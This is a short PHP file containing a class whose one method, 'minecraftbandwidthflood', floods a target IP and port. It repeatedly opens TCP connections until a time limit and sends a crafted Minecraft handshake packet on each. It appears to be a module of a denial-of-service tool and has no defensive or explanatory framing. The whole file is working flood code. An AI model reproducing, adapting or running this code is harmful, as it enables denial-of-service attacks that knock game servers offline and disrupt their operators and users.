<?php
class minecraft{
	function minecraftbandwidthflood($ip, $port, $starttime, $max_time, $exec_time){
		while(1){
			try{
				$packets++; 
				if(time() > $max_time){
					output($packets, $starttime, $exec_time, $lenght);
					break; 
				}
				$fp[$packets] = fsockopen($ip, $port, $errno, $errstr, 1);
				fwrite($fp[$packets], "\x15\x00\xd4\x02\x0e" . $ip . "\x65\xc2\x02");
			}catch (Exception $e){
				echo $e;
			}
		}
	}
}
?>